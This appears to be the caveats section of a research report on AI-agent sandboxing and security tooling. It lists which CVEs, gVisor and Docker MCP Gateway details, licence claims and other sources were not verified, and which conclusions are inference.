- **Cursor "DuneSlide" CVE-2026-50548/50549** is known only from a CSA research note and search snippets; not verified.
- **DeepSeek Harness CVE-2026-82533** and **hermes-agent CVE-2026-9368** showed up in search results (ox.security, miggo.io) but were not verified. Omitted from the tables.
- **gVisor CVE-2025-2713**: the primary advisory was not read, so the description is unverified.
- **Docker MCP Gateway flags** (`--block-network`, `--block-secrets`, `--verify-signatures`, `--log-calls`, interceptors): the fetched README summary did not show them. The docs pages confirm the capabilities (secret blocking, resource limits, signatures, logging) but not the exact flag names.
- **Host eBPF vs Kata/Firecracker guest visibility**: I found no primary doc stating "host eBPF cannot see inside a VM guest" in so many words. It follows from the architecture (separate guest kernel), but it is marked as inference.
- **gVisor runtime-monitoring doc pages** (`/docs/user_guide/runtime_monitoring/`, `/docs/user_guide/falco/`) returned 404. I used the gVisor blog and the Falco and gVisor tutorial URLs instead.
- **OTel GenAI semconv version numbers** (v1.41, MCP span naming) are from a secondary vendor explainer (dash0).
- The Langfuse docs page summarizer claimed AGPL-3.0. The repo README says MIT except `ee`, and I used the repo statement.
- **Tracebit's primary Gemini CLI write-up** was not fetched. The facts come from BleepingComputer.
- Tailscale exit-node or app-connector egress filtering for homelab was not researched in depth.
